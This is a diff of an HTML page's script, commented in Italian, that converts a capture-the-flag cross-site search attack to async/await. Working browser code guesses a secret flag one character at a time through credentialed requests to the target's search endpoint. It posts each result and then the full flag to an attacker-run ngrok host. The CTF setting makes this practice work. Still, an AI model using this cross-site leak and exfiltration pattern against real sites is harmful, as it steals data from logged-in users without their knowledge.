@@ -11,59 +11,56 @@
     const baseUrl = 'https://matrix.capturetheflags.site/search?s=flag{';
     const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[];:\'",.<>?/|\\';
     let currentFlag = 'flag{'; // Inizio della flag
-    let position = 5; // Posizione successiva da testare
 
-    const logProgress = (message) => {
-        fetch('https://bcc2-87-4-142-72.ngrok-free.app/log', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-            },
-            body: `log=${encodeURIComponent(message)}`
-        });
+    const logProgress = async (message) => {
+    await fetch('https://bcc2-87-4-142-72.ngrok-free.app/log', {
+
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `message=${encodeURIComponent(message)}`  // Updated to use 'message'
+    });
     };
 
-    const testChar = (position) => {
+
+    const testChar = async (position) => {
         if (position < 100) { // Limite superiore
             for (let char of chars) {
                 const query = `${baseUrl}${currentFlag}${char}`;
-                fetch(query, {
+                const response = await fetch(query, {
                     method: 'GET',
-                    credentials: 'include',
-                    mode: 'no-cors'
-                })
-                .then(response => {
-                    if (response.ok) {
-                        logProgress(`Trovato carattere ${char} per la posizione ${position}`);
-                        console.log(`Trovato carattere ${char} per la posizione ${position}`);
-                        currentFlag += char; // Aggiungi carattere
-                        testChar(currentFlag.length); // Prossima posizione
-                        return; // Esci per evitare conflitti
-                    } else {
-                        logProgress(`Carattere ${char} non valido per la posizione ${position}`);
-                        console.log(`Carattere ${char} non valido per la posizione ${position}`);
-                    }
-                })
-                .catch(error => console.error('Errore:', error));
+                    credentials: 'include'
+                });
+
+                if (response.ok) {
+                    await logProgress(`Trovato carattere ${char} per la posizione ${position}`);
+                    console.log(`Trovato carattere ${char} per la posizione ${position}`);
+                    currentFlag += char; // Aggiungi carattere
+                    await testChar(currentFlag.length); // Prossima posizione
+                    return; // Esci per evitare conflitti
+                } else {
+                    await logProgress(`Carattere ${char} non valido per la posizione ${position}`);
+                    console.log(`Carattere ${char} non valido per la posizione ${position}`);
+                }
             }
         } else {
             console.log(`Flag completa: ${currentFlag}`);
             // Invia la flag al tuo server Flask
-            fetch('https://bcc2-87-4-142-72.ngrok-free.app/receive_flag', {
+            const response = await fetch('https://bcc2-87-4-142-72.ngrok-free.app/receive_flag', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
                 },
                 body: `flag=${encodeURIComponent(currentFlag)}`
-            })
-            .then(response => response.text())
-            .then(data => console.log(data))
-            .catch(error => console.error('Errore:', error));
+            });
+            const data = await response.text();
+            console.log(data);
         }
     };
 
     // Inizia il test
-    testChar(position);
+    testChar(currentFlag.length);
     </script>
 </body>
 </html>
